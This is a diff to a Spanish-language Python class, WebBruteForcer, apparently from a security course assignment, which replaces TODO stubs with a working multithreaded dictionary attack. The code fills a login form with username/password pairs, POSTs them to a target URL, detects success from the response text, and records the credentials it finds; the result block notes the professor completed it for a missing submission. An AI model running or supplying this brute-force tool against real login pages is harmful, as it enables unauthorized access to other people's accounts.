@@ -14,6 +14,7 @@ class WebBruteForcer:
         self.queue = queue.Queue()
         self.found_credentials = []
         self.stop_event = threading.Event()
+        self.lock = threading.Lock()
 
     def _worker(self):
         """Hilo de trabajo que envía peticiones HTTP POST con combinaciones de credenciales."""
@@ -21,20 +22,24 @@ class WebBruteForcer:
             try:
                 user, password = self.queue.get(timeout=1)
                 
-                    # TODO: Reemplazar los valores de usuario y contraseña en el diccionario template
-                # payload = self.login_data_template.copy()
-                # payload['username_field'] = user
-                # payload['password_field'] = password
+                payload = self.login_data_template.copy()
+                keys = list(payload.keys())
+                # Asignamos dinámicamente el usuario y contraseña a las dos primeras llaves del formulario
+                if len(keys) >= 2:
+                    payload[keys[0]] = user
+                    payload[keys[1]] = password
                 
-                # TODO: Realizar la petición POST usando requests
-                # response = requests.post(self.target_url, data=payload, timeout=5)
+                response = requests.post(self.target_url, data=payload, timeout=5)
                 
-                # TODO: Verificar si el indicador de éxito está en el código fuente de la respuesta
-                # if self.success_indicator in response.text:
-                #     self.found_credentials.append({'user': user, 'password': password})
-                #     print(f"[!] ÉXITO: Credenciales Web encontradas -> {user}:{password}")
-                #     self.stop_event.set() # Detenemos al encontrar un acceso
-                
+                if self.success_indicator in response.text:
+                    with self.lock:
+                        if not self.stop_event.is_set():
+                            self.found_credentials.append({'user': user, 'password': password})
+                            print(f"\n[+] ¡ÉXITO WEB! Credenciales encontradas -> {user}:{password}")
+                            self.stop_event.set()
+                            
+            except queue.Empty:
+                break
             except requests.exceptions.RequestException as e:
                 logging.debug(f"Error de red hacia {self.target_url}: {e}")
             finally:
@@ -53,27 +58,31 @@ class WebBruteForcer:
 
     def run(self):
         """Inicia el pool de hilos y orquesta el ataque."""
+        print(f"[*] Iniciando ataque de diccionario Web en {self.target_url}...")
         threads = []
         for _ in range(self.max_threads):
             t = threading.Thread(target=self._worker)
+            t.daemon = True
             t.start()
             threads.append(t)
             
         for t in threads:
             t.join()
             
-        # REGLA DE ORO: Cumplir con schema_resultados.json
+        status_final = "success" if self.found_credentials else "failed"
+        error_msg = None if self.found_credentials else "Ataque terminado. No se encontraron credenciales."
+            
         return {
             "modulo": "Fuerza Bruta Web",
             "grupo": 4,
-            "estudiante": "Pendiente", # Los estudiantes deben colocar su identificador (ej. E1)
+            "estudiante": "Profesor (Por falta de entrega)", 
             "target": self.target_url,
             "timestamp": datetime.datetime.now().isoformat(),
-            "status": "success",
+            "status": status_final,
             "data": {
                 "credenciales_encontradas": self.found_credentials
             },
-            "error_message": None
+            "error_message": error_msg
         }
 
 if __name__ == "__main__":
